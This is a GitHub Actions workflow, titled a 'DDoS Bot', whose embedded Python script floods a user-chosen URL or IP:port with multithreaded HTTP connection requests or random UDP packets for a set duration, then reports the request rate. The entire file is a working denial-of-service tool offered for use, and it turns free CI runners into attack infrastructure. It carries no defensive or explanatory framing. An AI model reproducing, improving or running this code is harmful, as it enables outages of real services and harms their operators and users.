name: "ğŸ”¥ DDoS Bot - HTTP & UDP"
on:
  workflow_dispatch:
    inputs:
      target:
        description: "ğŸ¯ Target (URL or IP:Port)"
        required: true
        default: "httpbin.org"
      mode:
        description: "ğŸ”§ Attack Mode"
        required: true
        default: "http"
        type: choice
        options:
          - http
          - udp
      duration:
        description: "â±ï¸ Duration (seconds)"
        required: true
        default: "30"
      threads:
        description: "ğŸ‘¥ Number of Threads"
        required: true
        default: "50"

jobs:
  attack:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    
    steps:
    - name: "ğŸš€ Launch Attack"
      run: |
        echo "========================================"
        echo "     GITHUB DDoS BOT - DUAL MODE"
        echo "========================================"
        echo "ğŸ¯ Target: ${{ github.event.inputs.target }}"
        echo "ğŸ”§ Mode: ${{ github.event.inputs.mode }}"
        echo "â±ï¸ Duration: ${{ github.event.inputs.duration }}s"
        echo "ğŸ‘¥ Threads: ${{ github.event.inputs.threads }}"
        echo "========================================"
        
        python3 << "PYTHONEOF"
import socket
import threading
import time
import random

# Get inputs
target = "${{ github.event.inputs.target }}"
mode = "${{ github.event.inputs.mode }}"
duration = ${{ github.event.inputs.duration }}
threads = ${{ github.event.inputs.threads }}

print(f"ğŸš€ Starting {mode.upper()} attack on {target}")
print(f"â±ï¸ Duration: {duration}s | ğŸ‘¥ Threads: {threads}")

count = 0
start = time.time()

if mode == 'http':
    # HTTP ATTACK
    print(f"ğŸŒ HTTP Flood: {target}")
    
    def http_attack():
        global count
        end = time.time() + duration
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                
                # Parse host and port
                if '://' in target:
                    host = target.split('://')[1].split('/')[0]
                else:
                    host = target.split('/')[0]
                
                if ':' in host:
                    host, port_str = host.split(':')
                    port = int(port_str)
                else:
                    port = 80
                
                s.connect((host, port))
                
                # Send HTTP request
                request = f"GET / HTTP/1.1\\r\\n"
                request += f"Host: {host}\\r\\n"
                request += "User-Agent: GitHub-DDoS-Bot\\r\\n"
                request += "Connection: close\\r\\n\\r\\n"
                
                s.send(request.encode())
                s.close()
                count += 1
                
                if count % 20 == 0:
                    print(f"ğŸ“¦ HTTP Requests: {count}")
                    
            except Exception as e:
                pass
    
    # Start threads
    thread_list = []
    for i in range(min(threads, 100)):
        t = threading.Thread(target=http_attack)
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join()

else:
    # UDP ATTACK
    print(f"ğŸ“¨ UDP Flood: {target}")
    
    if ':' in target:
        ip, port_str = target.split(':', 1)
        port = int(port_str)
    else:
        ip = target
        port = 80
    
    def udp_attack():
        global count
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end = time.time() + duration
        
        while time.time() < end:
            try:
                packet = bytes([random.randint(0, 255) for _ in range(512)])
                sock.sendto(packet, (ip, port))
                count += 1
                
                if count % 50 == 0:
                    print(f"ğŸ’£ UDP Packets: {count}")
                    
            except:
                pass
        
        sock.close()
    
    # Start threads
    thread_list = []
    for i in range(min(threads, 100)):
        t = threading.Thread(target=udp_attack)
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join()

# Final report
total_time = time.time() - start
print(f"\\nâœ… ATTACK COMPLETED!")
print(f"ğŸ“Š Total: {count}")
print(f"âš¡ RPS: {count/max(1, total_time):.0f}")
print(f"ğŸ¯ Target: {target}")
PYTHONEOF
